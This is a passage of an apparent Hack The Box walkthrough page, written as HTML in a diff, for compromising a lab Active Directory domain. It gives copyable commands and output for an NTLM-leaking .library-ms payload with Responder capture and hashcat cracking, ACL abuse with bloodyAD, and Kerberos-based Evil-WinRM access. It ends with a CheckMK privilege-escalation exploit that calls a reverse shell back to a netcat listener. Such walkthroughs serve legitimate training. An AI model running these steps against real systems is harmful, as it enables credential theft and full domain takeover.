+            <div class="flow" style="background:var(--bg3);border-radius:6px;margin-bottom:14px">
+              <div class="flow-row">
+                <div class="flow-node">Upload .zip</div>
+                <div class="flow-arrow">→</div>
+                <div class="flow-node">Windows extracts</div>
+                <div class="flow-arrow">→</div>
+                <div class="flow-node">Renders .library-ms</div>
+                <div class="flow-arrow">→</div>
+                <div class="flow-node target">Follows UNC path</div>
+                <div class="flow-arrow">→</div>
+                <div class="flow-node target">SMB auth with NTLM</div>
+                <div class="flow-arrow">→</div>
+                <div class="flow-node owned">Responder captures 🎯</div>
+              </div>
+            </div>
+
+            <div class="info-box info-blue">
+              <strong>REFERENCE</strong>
+              Read the full technical deep-dive at checkpoint research: <span style="font-family:var(--mono);color:var(--accent5)">research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Step 1 — Start Responder</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — KALI (run first)<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">sudo responder -I tun0</div>
+            </div>
+            <div class="cmd-explain"><b>Keep this running</b> before uploading the exploit. Responder will host a fake SMB server on your tun0 (HTB VPN) interface and intercept authentication attempts.</div>
+          </div>
+        </div>
+
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Step 2 — Generate the .library-ms Payload (Python PoC)</span></div>
+          <div class="card-body">
+            <div class="info-box info-purple">
+              <strong>EXPLOIT SCRIPT</strong>
+              Use the Python script from ExploitDB (Beatriz Fresno Naumova). It creates a ZIP containing a .library-ms XML file pointing at your IP. The XML structure uses Windows' searchConnectorDescription to point to your fake UNC share.
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Generate exploit ZIP<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">python3 exploit.py --file resume --target &lt;YOUR_TUN0_IP&gt; --zip exploit.zip</div>
+            </div>
+            <div class="cmd-explain">Replace <span class="flag">&lt;YOUR_TUN0_IP&gt;</span> with your Kali tun0 IP (check with <span class="flag">ip a show tun0</span>). The generated XML will point UNC path to <span class="flag">\\YOUR_IP\shared</span>.</div>
+
+            <div class="cmd-block" style="margin-top:12px">
+              <div class="cmd-label">GENERATED .library-ms XML CONTENT<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+  &lt;searchConnectorDescriptionList&gt;
+    &lt;searchConnectorDescription&gt;
+      &lt;simpleLocation&gt;
+        &lt;url&gt;\\&lt;YOUR_IP&gt;\shared&lt;/url&gt;
+      &lt;/simpleLocation&gt;
+    &lt;/searchConnectorDescription&gt;
+  &lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Step 3 — Upload &amp; Wait</span></div>
+          <div class="card-body">
+            <div class="info-box info-green">
+              <strong>UPLOAD</strong>
+              Upload exploit.zip to the file upload form on hire.nanocorp.htb. Wait ~30–60 seconds. Responder will receive the NTLMv2 authentication attempt.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 4: HASH ══ -->
+    <section class="section" id="s4">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,200,87,0.1)">🔓</div>
+        <div>
+          <div class="section-title">HASH CAPTURE &amp; CRACK</div>
+          <div class="section-sub">Responder catches NTLMv2 — hashcat breaks it offline.</div>
+        </div>
+        <span class="step-tag" style="background:rgba(255,200,87,0.1);color:var(--accent4);border:1px solid rgba(255,200,87,0.2)">STEP 04</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Responder Captures NTLMv2 Hash</span></div>
+          <div class="card-body">
+            <div class="output-block"><span class="hl-ok">[SMB] NTLMv2-SSP Client   :</span> 10.129.243.199
+<span class="hl-ok">[SMB] NTLMv2-SSP Username :</span> <span class="hl-user">NANOCORP\web_svc</span>
+<span class="hl-ok">[SMB] NTLMv2-SSP Hash     :</span> <span class="hl-hash">web_svc::NANOCORP:a4171e181bdc5d39:3ECE0C9D429D44564B3962E010B64
+24F:010100000000000080BCC6F403C1DC014D3B03F4E8FF5F620000000002000800
+580056004F00530001001E00570049004E002D004F00490031004A003000340035
+005A004C005A00550004003400570049004E002D004F00490031004A003000340
+035005A004C005A0055002E00580056004F0053002E004C004F00430041004C00
+...</span></div>
+
+            <div class="info-box info-gold">
+              <strong>COPY THE FULL HASH</strong>
+              Copy the entire hash (everything after "Hash :") including all continuation lines. Save it to a file like hash.txt. Paste everything as one continuous string — no line breaks.
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Crack with Hashcat</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Save hash<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">nano hash.txt
+# Paste the full NTLMv2 hash</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Crack NTLMv2 (mode 5600)<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</div>
+            </div>
+            <div class="cmd-explain"><span class="flag">-m 5600</span> = NTLMv2 mode. rockyou.txt gets it easily since the password is in common wordlists.</div>
+            <div class="output-block" style="margin-top:10px"><span class="hl-user">web_svc</span>:<span class="hl-hash">dksehdgh712!@#</span>          <span style="color:var(--accent3)">STATUS: Cracked!</span></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Validate Creds with NetExec</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Verify SMB<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">nxc smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#'</div>
+            </div>
+            <div class="output-block">SMB  10.129.243.199  445  DC01  [*] Windows Server 2022
+SMB  10.129.243.199  445  DC01  <span class="hl-ok">[+] nanocorp.htb\web_svc:dksehdgh712!@#</span></div>
+            <div class="cmd-block" style="margin-top:10px">
+              <div class="cmd-label">BASH — Check RDP access (expect fail)<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">nxc rdp nanocorp.htb -u web_svc -p 'dksehdgh712!@#'</div>
+            </div>
+            <div class="cmd-explain">As expected for a service account, <b>web_svc has no RDP access</b>. Need to pivot through AD.</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 5: AD ENUM ══ -->
+    <section class="section" id="s5">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(124,92,252,0.1)">🏰</div>
+        <div>
+          <div class="section-title">AD ENUMERATION</div>
+          <div class="section-sub">LDAP user dump reveals the pivot target: monitoring_svc.</div>
+        </div>
+        <span class="step-tag" style="background:rgba(124,92,252,0.1);color:var(--accent);border:1px solid rgba(124,92,252,0.2)">STEP 05</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">LDAP User Enumeration</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Dump domain users<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">nxc ldap nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --users</div>
+            </div>
+            <div class="output-block">LDAP  DC01  <span class="hl-ok">[+] nanocorp.htb\web_svc:dksehdgh712!@#</span>
+LDAP  DC01  [*] Enumerated <span class="hl-user">5 domain users</span>
+
+-Username-          -Last PW Set-       -BadPW-  -Description-
+<span class="hl-hash">Administrator</span>       2025-04-09 19:00:49  0       Built-in admin
+Guest               &lt;never&gt;              0       Guest account
+krbtgt              2025-04-02 21:38:45  0       KDC Service Account
+<span class="hl-user">web_svc</span>             2025-04-09 18:59:38  0
+<span class="hl-ok">monitoring_svc</span>      2026-03-31 19:13:56  0       <span style="color:var(--accent3)">← TARGET</span></div>
+
+            <div class="info-box info-purple" style="margin-top:12px">
+              <strong>PIVOT TARGET: monitoring_svc</strong>
+              Of the 5 users, only monitoring_svc is interesting. krbtgt is the KDC service account (not a real user). The recently set password on monitoring_svc is suspicious — confirmed via BloodHound to have WinRM access.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 6: BLOODHOUND ══ -->
+    <section class="section" id="s6">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(124,92,252,0.1)">🐕</div>
+        <div>
+          <div class="section-title">BLOODHOUND &amp; TRUST MAPPING</div>
+          <div class="section-sub">Map the full ACL chain to domain compromise.</div>
+        </div>
+        <span class="step-tag" style="background:rgba(124,92,252,0.1);color:var(--accent);border:1px solid rgba(124,92,252,0.2)">STEP 06</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Collect BloodHound Data</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — BloodHound collection via nxc<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">nxc ldap nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --bloodhound --collection All --dns-server &lt;DOMAIN_IP&gt;</div>
+            </div>
+            <div class="cmd-explain">Outputs a ZIP file importable into BloodHound. Contains all group memberships, ACLs, sessions, and object attributes.</div>
+          </div>
+        </div>
+
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">🧬 Discovered ACL Chain</span></div>
+          <div class="card-body">
+            <div class="flow">
+              <div class="flow-row" style="flex-wrap:wrap;gap:12px">
+                <div>
+                  <div style="font-family:var(--mono);font-size:9px;color:var(--text3);margin-bottom:4px">COMPROMISED</div>
+                  <div class="flow-node owned">web_svc</div>
+                </div>
+                <div style="text-align:center">
+                  <div style="font-family:var(--mono);font-size:9px;color:var(--accent4);margin-bottom:4px">AddSelf</div>
+                  <div class="flow-arrow" style="font-size:20px">→</div>
+                </div>
+                <div>
+                  <div style="font-family:var(--mono);font-size:9px;color:var(--text3);margin-bottom:4px">GROUP</div>
+                  <div class="flow-node pivot">IT_SUPPORT</div>
+                </div>
+                <div style="text-align:center">
+                  <div style="font-family:var(--mono);font-size:9px;color:var(--accent2);margin-bottom:4px">ForceChangePassword</div>
+                  <div class="flow-arrow" style="font-size:20px">→</div>
+                </div>
+                <div>
+                  <div style="font-family:var(--mono);font-size:9px;color:var(--text3);margin-bottom:4px">TARGET</div>
+                  <div class="flow-node target">monitoring_svc</div>
+                </div>
+                <div style="text-align:center">
+                  <div style="font-family:var(--mono);font-size:9px;color:var(--accent3);margin-bottom:4px">CanRDP / WinRM</div>
+                  <div class="flow-arrow" style="font-size:20px">→</div>
+                </div>
+                <div>
+                  <div style="font-family:var(--mono);font-size:9px;color:var(--text3);margin-bottom:4px">TARGET</div>
+                  <div class="flow-node owned">DC01 🏁</div>
+                </div>
+              </div>
+            </div>
+            <div class="info-box info-purple" style="margin-top:14px">
+              <strong>ATTACK PATH BREAKDOWN</strong>
+              <b>AddSelf</b>: web_svc can add itself to IT_SUPPORT without needing admin approval. &nbsp;·&nbsp;
+              <b>ForceChangePassword</b>: IT_SUPPORT members can force-reset monitoring_svc's password without knowing the old one. &nbsp;·&nbsp;
+              <b>WinRM Access</b>: monitoring_svc has PSRemoting/WinRM rights to DC01.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 7: BLOODYADD ══ -->
+    <section class="section" id="s7">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(124,92,252,0.1)">🩸</div>
+        <div>
+          <div class="section-title">BLOODYADD — ACL ABUSE</div>
+          <div class="section-sub">Execute the ACL chain: add-self → force-change password.</div>
+        </div>
+        <span class="step-tag" style="background:rgba(124,92,252,0.1);color:var(--accent);border:1px solid rgba(124,92,252,0.2)">STEP 07</span>
+      </div>
+
+      <div class="callout">
+        <div class="callout-title">⚠ TIMING WARNING</div>
+        After running the password change command, you have a very short window before the lab resets monitoring_svc to its default state upon a failed WinRM login. Run kinit immediately after step 2 below — do not attempt Evil-WinRM with password auth first.
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">Step 1 — Add web_svc to IT_SUPPORT</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — AddSelf abuse<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">bloodyAD -d nanocorp.htb \
+  -u 'web_svc' \
+  -p 'dksehdgh712!@#' \
+  --dc-ip &lt;TARGET_IP&gt; \
+  add groupMember 'IT_SUPPORT' 'WEB_SVC'</div>
+            </div>
+            <div class="cmd-explain">Uses the <b>AddSelf</b> ACL to add web_svc to IT_SUPPORT. Now web_svc inherits IT_SUPPORT's rights, including ForceChangePassword over monitoring_svc.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Step 2 — Force-Change monitoring_svc Password</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — ForceChangePassword<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">bloodyAD -d nanocorp.htb \
+  -u 'web_svc' \
+  -p 'dksehdgh712!@#' \
+  --dc-ip &lt;TARGET_IP&gt; \
+  set password 'monitoring_svc' 'Pa$$word123!'</div>
+            </div>
+            <div class="cmd-explain">Forces the password change without knowing the old password. <span class="cred">Do kinit immediately after this.</span></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 8: KERBEROS ══ -->
+    <section class="section" id="s8">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(252,92,125,0.1)">🎟️</div>
+        <div>
+          <div class="section-title">KERBEROS + EVIL-WINRM</div>
+          <div class="section-sub">TGT-based auth bypasses the password reset race condition.</div>
+        </div>
+        <span class="step-tag" style="background:rgba(252,92,125,0.1);color:var(--accent2);border:1px solid rgba(252,92,125,0.2)">STEP 08</span>
+      </div>
+
+      <div class="callout">
+        <div class="callout-title">🔑 WHY KERBEROS INSTEAD OF PASSWORD</div>
+        Using <span style="font-family:var(--mono);color:var(--accent4)">evil-winrm -p</span> (password auth) against port 5986 fails with an authorization error AND triggers the lab to reset monitoring_svc's password. To avoid this race condition, obtain a TGT via kinit, export it, and use Evil-WinRM with the cached ticket instead.
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">Step 1 — Generate krb5.conf</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Auto-generate Kerberos config<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">nxc smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --generate-krb5-file krb5.conf</div>
+            </div>
+            <div class="cmd-explain">Generates a proper krb5.conf so Kali knows the KDC location, realm, and DNS mappings for nanocorp.htb. Place it at <span class="flag">/etc/krb5.conf</span> or export <span class="flag">KRB5_CONFIG=./krb5.conf</span>.</div>
+            <div class="cmd-block" style="margin-top:8px">
+              <div class="cmd-label">BASH<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">sudo cp krb5.conf /etc/krb5.conf</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Step 2 — Obtain TGT via kinit</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Request TGT (immediately after BloodyAD!)<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">kinit monitoring_svc@NANOCORP.HTB
+# Enter password when prompted: Pa$$word123!</div>
+            </div>
+            <div class="cmd-explain">The realm <span class="flag">NANOCORP.HTB</span> must be uppercase. This writes a TGT to the Kerberos credential cache. Verify with <span class="flag">klist</span>.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Step 3 — Export Ticket &amp; Get Shell</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Export TGT<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">export KRB5CCNAME=/tmp/krb5cc_1000</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Evil-WinRM with Kerberos ticket<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">evil-winrm -i dc01.nanocorp.htb \
+  -r NANOCORP.HTB \
+  -u monitoring_svc \
+  -K /tmp/krb5cc_1000 \
+  -S -P 5986</div>
+            </div>
+            <div class="cmd-explain">
+              <span class="flag">-r NANOCORP.HTB</span> Kerberos realm &nbsp;·&nbsp;
+              <span class="flag">-K</span> path to TGT cache &nbsp;·&nbsp;
+              <span class="flag">-S</span> SSL &nbsp;·&nbsp;
+              <span class="flag">-P 5986</span> non-default WinRM port
+            </div>
+          </div>
+        </div>
+
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">🐛 Kerberos Troubleshooting</span></div>
+          <div class="card-body">
+            <table class="ref-table">
+              <tr><th>ERROR</th><th>CAUSE</th><th>FIX</th></tr>
+              <tr>
+                <td>Clock skew too great</td>
+                <td style="color:var(--text2)">System time out of sync with DC (Kerberos allows ±5min)</td>
+                <td style="color:var(--accent3)">sudo ntpdate &lt;DC_IP&gt; or timedatectl set-ntp false + manual sync</td>
+              </tr>
+              <tr>
+                <td>Cannot contact KDC</td>
+                <td style="color:var(--text2)">Bad krb5.conf or missing /etc/hosts entries</td>
+                <td style="color:var(--accent3)">Re-run nxc --generate-krb5-file, verify dc01.nanocorp.htb in /etc/hosts</td>
+              </tr>
+              <tr>
+                <td>Preauthentication failed</td>
+                <td style="color:var(--text2)">Wrong password or account locked out</td>
+                <td style="color:var(--accent3)">Re-run BloodyAD password change; check nxc badpw counter</td>
+              </tr>
+              <tr>
+                <td>Authorization error (WinRM)</td>
+                <td style="color:var(--text2)">Password reset by lab; ticket expired; wrong realm case</td>
+                <td style="color:var(--accent3)">Redo BloodyAD → kinit → export → evil-winrm. Realm MUST be UPPERCASE.</td>
+              </tr>
+              <tr>
+                <td>SSL cert error</td>
+                <td style="color:var(--text2)">Self-signed cert on port 5986</td>
+                <td style="color:var(--accent3)">evil-winrm already ignores self-signed certs by default with -S flag</td>
+              </tr>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 9: USER FLAG ══ -->
+    <section class="section" id="s9">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(57,255,178,0.1)">🏁</div>
+        <div>
+          <div class="section-title">USER FLAG</div>
+          <div class="section-sub">Shell as monitoring_svc — grab user.txt from Desktop.</div>
+        </div>
+        <span class="step-tag" style="background:rgba(57,255,178,0.1);color:var(--accent3);border:1px solid rgba(57,255,178,0.2)">STEP 09</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">Grab user.txt</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">EVIL-WINRM SHELL<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">cd C:\Users\monitoring_svc\Desktop
+type user.txt</div>
+            </div>
+            <div class="info-box info-green">
+              <strong>USER FLAG ✓</strong>
+              user.txt is on the Desktop as expected. Submit it to HTB.
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Quick Enum Before PrivEsc</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">POWERSHELL — Installed services<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">Get-Service | Where-Object {$_.Status -eq "Running"}
+whoami /priv
+net localgroup administrators</div>
+            </div>
+            <div class="cmd-explain">Enumerate installed services and privileges. Look for CheckMK agent — the vector for the privilege escalation CVE.</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 10: CVE-2024-0670 ══ -->
+    <section class="section" id="s10">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(252,92,125,0.1)">📦</div>
+        <div>
+          <div class="section-title">CVE-2024-0670 — CHECKM K PRIVESC</div>
+          <div class="section-sub">MSI repair race condition → NT AUTHORITY\SYSTEM</div>
+        </div>
+        <span class="step-tag" style="background:rgba(252,92,125,0.1);color:var(--accent2);border:1px solid rgba(252,92,125,0.2)">STEP 10</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Vulnerability Overview</span></div>
+          <div class="card-body">
+            <div class="info-box info-red">
+              <strong>CVE-2024-0670 — CheckMK Windows Agent Local Privilege Escalation</strong>
+              The CheckMK MSI repair system uses files from C:\Windows\Temp — which is writable by all users but not listable. By placing a malicious script in that directory before the MSI repair process runs, we can hijack execution context and achieve SYSTEM-level code execution.
+            </div>
+            <div class="info-box info-blue">
+              <strong>KEY CONSTRAINTS</strong>
+              C:\Windows\Temp: <b>writable</b> by all users, but <b>not listable</b> (no dir command works). You can write and execute files there but can't browse. The exploit must be triggered as <span style="font-family:var(--mono);color:var(--accent4)">web_svc</span>, not monitoring_svc — web_svc has the necessary rights.
+            </div>
+            <div class="info-box info-purple">
+              <strong>EXPLOIT REPO</strong>
+              Full methodology + scripts available at: <span style="font-family:var(--mono);color:var(--accent5)">github.com/elsevar11/CVE-2024-0670-CheckMK-Agent-Local-Privilege-Escalation-Exploit</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Step 1 — Get Shell as web_svc First</span></div>
+          <div class="card-body">
+            <div class="info-box info-gold">
+              <strong>⚠ USE web_svc, NOT monitoring_svc</strong>
+              Running RunasCs.exe as monitoring_svc fails — insufficient permissions. web_svc has the rights needed. Get a WinRM shell as web_svc first.
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Shell as web_svc<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">evil-winrm -i dc01.nanocorp.htb -r NANOCORP.HTB \
+  -u web_svc -p 'dksehdgh712!@#' -S -P 5986</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Step 2 — Upload Exploit Files</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">EVIL-WINRM — Upload tools<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">upload RunasCs.exe
+upload nc.exe
+upload exploit.ps1</div>
+            </div>
+            <div class="cmd-explain">Evil-WinRM uploads to the current directory by default. Files land in C:\Windows\Temp or wherever you cd'd to. Confirm each upload succeeds.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Step 3 — Listener + Trigger Exploit</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Netcat listener<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">nc -lnvp 1111</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">EVIL-WINRM (as web_svc) — Run exploit<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">.\RunasCs.exe web_svc "dksehdgh712!@#" `
+  "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"</div>
+            </div>
+            <div class="cmd-explain">RunasCs executes the exploit script in the CheckMK MSI repair context. The reverse shell connects back to your nc listener.</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 11: SYSTEM ══ -->
+    <section class="section" id="s11">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(57,255,178,0.1)">🏆</div>
+        <div>
+          <div class="section-title">NT AUTHORITY\SYSTEM</div>
+          <div class="section-sub">Full domain compromise — grab root.txt.</div>
+        </div>
+        <span class="step-tag" style="background:rgba(57,255,178,0.1);color:var(--accent3);border:1px solid rgba(57,255,178,0.2)">STEP 11</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Confirm SYSTEM + Root Flag</span></div>
+          <div class="card-body">
+            <div class="output-block"><span class="hl-ok">Connection from 10.10.17.39:1111</span>
+Windows PowerShell running as <span class="hl-user">NT AUTHORITY\SYSTEM</span>
+
+PS C:\Windows\system32&gt; whoami
+<span class="hl-ok">nt authority\system</span>
+
+PS C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\root.txt
+<span class="hl-hash">HTB{...}</span></div>
+
+            <div class="info-box info-green">
+              <strong>🏆 NANOCORP FULLY COMPROMISED</strong>
+              NT AUTHORITY\SYSTEM shell on DC01. The domain is owned. Submit root.txt to complete the lab.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 12: TOOLS REF ══ -->
+    <section class="section" id="s12">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,200,87,0.1)">🧰</div>
+        <div>
+          <div class="section-title">TOOLS &amp; COMMANDS REFERENCE</div>
+          <div class="section-sub">Quick reference for all tools used in this lab.</div>
+        </div>
+      </div>
+
+      <div class="card-grid">
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Full Tool Reference</span></div>
+          <div class="card-body">
+            <table class="ref-table">
+              <tr><th>TOOL</th><th>USED FOR</th><th>INSTALL</th></tr>
+              <tr><td>nmap</td><td style="color:var(--text2)">Initial port scan and service enumeration</td><td style="color:var(--accent3)">Built-in on Kali</td></tr>
+              <tr><td>responder</td><td style="color:var(--text2)">Fake SMB server to capture NTLMv2 hashes</td><td style="color:var(--accent3)">sudo apt install responder</td></tr>
+              <tr><td>hashcat</td><td style="color:var(--text2)">Offline NTLMv2 hash cracking (mode 5600)</td><td style="color:var(--accent3)">Built-in on Kali</td></tr>
+              <tr><td>nxc (netexec)</td><td style="color:var(--text2)">Credential validation, LDAP enum, BloodHound collection, krb5.conf gen</td><td style="color:var(--accent3)">pip install netexec</td></tr>
+              <tr><td>bloodhound</td><td style="color:var(--text2)">AD trust and ACL visualization</td><td style="color:var(--accent3)">sudo apt install bloodhound</td></tr>
+              <tr><td>bloodyAD</td><td style="color:var(--text2)">ACL abuse — AddSelf, ForceChangePassword</td><td style="color:var(--accent3)">pip install bloodyAD</td></tr>
+              <tr><td>kinit</td><td style="color:var(--text2)">Obtain Kerberos TGT from KDC</td><td style="color:var(--accent3)">sudo apt install krb5-user</td></tr>
+              <tr><td>klist</td><td style="color:var(--text2)">View cached Kerberos tickets</td><td style="color:var(--accent3)">Built-in with krb5-user</td></tr>
+              <tr><td>evil-winrm</td><td style="color:var(--text2)">WinRM shell with Kerberos ticket or password</td><td style="color:var(--accent3)">gem install evil-winrm</td></tr>
+              <tr><td>RunasCs.exe</td><td style="color:var(--text2)">Run commands as another user (Windows)</td><td style="color:var(--accent3)">github.com/antonioCoco/RunasCs</td></tr>
+              <tr><td>nc.exe</td><td style="color:var(--text2)">Reverse shell listener / netcat for Windows</td><td style="color:var(--accent3)">github.com/int0x33/nc.exe</td></tr>
+              <tr><td>exploit.ps1</td><td style="color:var(--text2)">CVE-2024-0670 CheckMK MSI repair exploit</td><td style="color:var(--accent3)">github.com/elsevar11/CVE-2024-0670</td></tr>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ SECTION 13: KERBEROS GUIDE ══ -->
+    <section class="section" id="s13">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,200,87,0.1)">🎟️</div>
+        <div>
+          <div class="section-title">KERBEROS TROUBLESHOOT GUIDE</div>
+          <div class="section-sub">Everything that can go wrong with Kerberos on HTB — and how to fix it.</div>
+        </div>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">Essential Kerberos Commands</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">Generate krb5.conf<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">nxc smb nanocorp.htb -u web_svc \
+  -p 'dksehdgh712!@#' --generate-krb5-file krb5.conf
+sudo cp krb5.conf /etc/krb5.conf</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">Request TGT<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">kinit monitoring_svc@NANOCORP.HTB</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">View tickets<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">klist</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">Export &amp; use ticket<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">export KRB5CCNAME=/tmp/krb5cc_1000
+# Or use klist -l to find ticket path</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">Destroy tickets (reset)<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">kdestroy</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">Clock Sync — Critical for HTB</span></div>
+          <div class="card-body">
+            <div class="info-box info-red">
+              <strong>CLOCK SKEW IS THE #1 KERBEROS KILLER</strong>
+              Kerberos tickets expire or fail if your system clock differs from the DC by more than 5 minutes. HTB machines are often 6–7 hours off from Kali's default time. Always sync before using Kerberos.
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Sync time with DC<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">sudo ntpdate &lt;TARGET_IP&gt;
+# Or:
+sudo timedatectl set-ntp false
+sudo date -s "$(curl -s --head http://nanocorp.htb | grep Date | sed 's/Date: //')"</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">BASH — Verify skew<button class="copy-btn">copy</button></div>
+              <div class="cmd-code">date
+# Compare with: nxc smb nanocorp.htb | grep start_date</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card card-full">
+          <div class="card-head"><span class="card-title">Kerberos Quick Checklist for This Lab</span></div>
+          <div class="card-body">
+            <div class="info-box info-green">
